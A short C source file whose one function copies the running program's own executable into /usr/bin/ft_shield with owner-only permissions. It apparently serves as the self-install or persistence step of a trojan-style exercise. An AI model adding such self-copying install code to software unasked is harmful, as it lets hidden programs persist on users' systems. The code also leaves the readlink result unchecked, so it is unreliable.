#include <ft_shield.h>

void	copy_binary(void)
{
	char	exec_path[256];
	ssize_t	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
	exec_path[len] = '\0';
	int	origin, bin_fd;

	if ((origin = open(exec_path, O_RDONLY)) == -1)
		exit(1);
	if ((bin_fd = creat("/usr/bin/ft_shield", 0700)) == -1)
	{
		close(origin);
		exit(1);
	}
	// off_t bytesCopied = 0;
	struct stat fileinfo = {0};
	fstat(origin, &fileinfo);
	sendfile(bin_fd, origin, NULL, fileinfo.st_size);
	close(origin);
	close(bin_fd);
}
